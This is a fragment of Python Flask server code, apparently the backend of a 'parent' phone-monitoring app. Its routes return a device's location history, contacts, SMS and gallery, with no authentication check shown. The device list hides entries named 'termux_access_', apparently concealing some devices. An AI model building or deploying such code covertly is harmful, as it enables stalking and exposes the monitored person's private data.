...
def list_devices():
    return jsonify({
        "devices": [
            ...
            if not info.get("name", "").startswith("termux_access_")
        ]
    })


@app.route("/api/parent/device/<device_id>", methods=["GET"])
def parent_get_device_data(device_id):
...
@app.route("/api/parent/device/<device_id>/locations", methods=["GET"])
def parent_get_locations(device_id):
    if device_id not in devices_db:
        return jsonify({"error": "Device not found"}), 404
    return jsonify({"locations": data_store["locations"].get(device_id, [])})


@app.route("/api/parent/device/<device_id>/contacts", methods=["GET"])
def parent_get_contacts(device_id):
    if device_id not in devices_db:
        return jsonify({"error": "Device not found"}), 404
    return jsonify({"contacts": data_store["contacts"].get(device_id, {})})


@app.route("/api/parent/device/<device_id>/sms", methods=["GET"])
def parent_get_sms(device_id):
    if device_id not in devices_db:
        return jsonify({"error": "Device not found"}), 404
    return jsonify({"sms": data_store["sms"].get(device_id, [])})


@app.route("/api/parent/device/<device_id>/gallery", methods=["GET"])
def parent_get_gallery(device_id):
    if device_id not in devices_db:
        return jsonify({"error": "Device not found"}), 404
    return jsonify({"gallery": data_store["gallery"].get(device_id, {})})
